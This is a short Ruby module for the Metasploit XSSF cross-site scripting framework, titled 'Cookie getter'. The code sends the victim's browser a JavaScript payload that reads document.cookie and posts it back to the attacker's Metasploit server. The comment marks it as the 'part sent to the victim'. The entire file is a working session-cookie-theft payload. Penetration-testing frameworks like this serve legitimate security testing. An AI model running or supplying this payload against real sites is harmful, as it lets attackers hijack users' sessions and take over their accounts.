require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Cookie getter',
			'Description' => 'Return to metasploit the cookie of the user'
		))
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		send_response(cli, %Q{ XSSF_POST(document.cookie, '#{self.name}')})
	end
end